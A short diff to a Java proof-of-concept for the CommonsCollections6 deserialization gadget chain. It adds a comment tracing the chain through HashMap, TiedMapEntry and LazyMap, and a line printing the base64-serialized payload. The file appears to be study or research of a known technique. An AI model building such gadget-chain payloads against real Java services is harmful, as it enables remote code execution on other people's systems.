@@ -11,6 +11,10 @@ import java.io.*;
 import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
+
+/**
+ * Hashmap(hashcode)->TiedmapEntry(hashcode)->TiedMapEntry(getvalue)->Lazymap(get)->transform
+ */
 public class CommonsCollections6 {
     public static void main(String[] args) throws Exception {
         Transformer[] transformers=new Transformer[]{
@@ -30,6 +34,7 @@ public class CommonsCollections6 {
         factory.setAccessible(true);
         factory.set(lazymap,chainedTransformer);
         String poc = SerializeUtils.base64serial(hashMap);
+        System.out.println(poc);
         SerializeUtils.base64deserial(poc);
     }
 }
